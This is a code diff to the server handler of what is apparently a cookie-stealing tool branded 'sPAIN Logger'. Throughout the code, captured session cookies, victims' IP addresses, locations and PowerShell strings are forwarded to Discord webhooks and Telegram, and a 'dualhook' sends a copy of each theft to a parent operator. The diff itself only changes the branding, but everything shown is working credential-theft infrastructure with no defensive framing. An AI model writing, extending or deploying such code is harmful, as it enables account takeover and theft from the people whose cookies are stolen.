@@ -102,12 +102,14 @@ const FLAGS = {
 function flag(c) { return FLAGS[c] || '🌐'; }
 
 // ── Discord helpers ───────────────────────────────────────────────────────────
-async function discordSend(url, payload, useSPainBranding = true) {
+async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    const webhookPayload = useSPainBranding 
-      ? { username: WH_NAME, avatar_url: WH_AVATAR, ...payload }
-      : { ...payload };
+    const webhookPayload = { 
+      username: WH_NAME, 
+      avatar_url: WH_AVATAR, 
+      ...payload 
+    };
     
     await fetch(url, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -116,7 +118,7 @@ async function discordSend(url, payload, useSPainBranding = true) {
   } catch (_) {}
 }
 
-async function discordChunked(url, text, useSPainBranding = true) {
+async function discordChunked(url, text) {
   let rem = text; let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
@@ -124,7 +126,7 @@ async function discordChunked(url, text, useSPainBranding = true) {
       content: first
         ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
         : chunk + (rem.length === 0 ? '\n```' : '')
-    }, useSPainBranding);
+    });
     first = false;
   }
 }
@@ -155,7 +157,7 @@ export default async function handler(req, res) {
   // Build webhook list
   let webhook1 = null;
   const webhook2 = record.webhook;
-  let dhParentName = null;
+ let dhParentName = null;
   
   if (isDH) {
     try {
@@ -181,18 +183,18 @@ export default async function handler(req, res) {
       { name: '🕐 Time', value: now, inline: true }
     ];
     
-    // Send to webhook2 (original page) without sPAIN branding
+    // Send to webhook2 (original page) with sPAIN branding
     await discordSend(webhook2, {
       content: '@everyone',
       embeds: [{
         title: '🍪 Cookie Captured',
-        description: `${pName} Logger`,
+        description: `${EMOJI} ${pName} ${EMOJI}`,
         color: 0xff3333,
         fields: baseFields,
-        footer: { text: `${pName} Logger` },
+        footer: { text: `sPAIN Logger • ${pName}` },
         timestamp: now
       }]
-    }, false);
+    });
     
     // Send to webhook1 (dualhook parent) with sPAIN branding
     if (webhook1) {
@@ -209,7 +211,7 @@ export default async function handler(req, res) {
           footer: { text: `sPAIN Logger • ${pName}` },
           timestamp: now
         }]
-      }, true);
+      });
     }
     
     await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
@@ -239,18 +241,18 @@ export default async function handler(req, res) {
       { name: '🕐 Time', value: now, inline: true }
     ];
     
-    // Send to webhook2 (original page) without sPAIN branding
+    // Send to webhook2 (original page) with sPAIN branding
     await discordSend(webhook2, {
       content: '@everyone',
       embeds: [{
         title: '🍪 Cookie Captured',
-        description: `${pName} Logger`,
+        description: `${EMOJI} ${pName} ${EMOJI}`,
         color: 0xff3333,
         fields: baseFields,
         footer: { text: `sPAIN Logger • ${pName}` },
         timestamp: now
       }]
-    }, false);
+    });
     
     // Send to webhook1 (dualhook parent) with sPAIN branding
     if (webhook1) {
@@ -267,7 +269,7 @@ export default async function handler(req, res) {
           footer: { text: `sPAIN Logger • ${pName}` },
           timestamp: now
         }]
-      }, true);
+      });
     }
     
     await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
@@ -311,10 +313,10 @@ export default async function handler(req, res) {
   // Cookie display — trimmed for embed, full via chunked message
   const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;
 
-  // ── Build the rich embed for webhook2 (page name, no sPAIN branding) ──────────────────────────────────────────────────
+  // ── Build the rich embed for webhook2 (page name, with sPAIN branding) ──────────────────────────────────────────────────
   const pageEmbed = {
     title: `🍪 Cookie Captured`,
-    description: `\n\n${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
+    description: `${EMOJI} ${pName} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [Discord Server](${DISCORD_INV})`,
     color: 5793266,
     thumbnail: { url: avatarUrl },
     fields: [
@@ -384,7 +386,7 @@ export default async function handler(req, res) {
         inline: false
       }
     ],
-    footer:    { text: `${pName} Logger • ${nowStr}` },
+    footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
     timestamp: nowStr
   };
 
@@ -471,23 +473,23 @@ export default async function handler(req, res) {
   };
 
   // ── Send to webhook2 (page name) ──────────────────────────────────────────────────
-  await discordSend(webhook2, { content: '@everyone', embeds: [pageEmbed] }, false);
+  await discordSend(webhook2, { content: '@everyone', embeds: [pageEmbed] });
 
   // Full cookie in chunked code block to webhook2
-  await discordChunked(webhook2, cookie, false);
+  await discordChunked(webhook2, cookie);
 
   // PowerShell if available to webhook2
-  if (info?.powershell) await discordChunked(webhook2, info.powershell, false);
+  if (info?.powershell) await discordChunked(webhook2, info.powershell);
 
   // ── Send to webhook1 (sPAIN) if exists ──────────────────────────────────────────────────
   if (webhook1) {
-    await discordSend(webhook1, { content: '@everyone', embeds: [sPainEmbed] }, true);
+    await discordSend(webhook1, { content: '@everyone', embeds: [sPainEmbed] });
 
     // Full cookie in chunked code block to webhook1
-    await discordChunked(webhook1, cookie, true);
+    await discordChunked(webhook1, cookie);
 
     // PowerShell if available to webhook1
-    if (info?.powershell) await discordChunked(webhook1, info.powershell, true);
+    if (info?.powershell) await discordChunked(webhook1, info.powershell);
   }
 
   // ── Telegram ─────────────────────────────────────────────────────────────
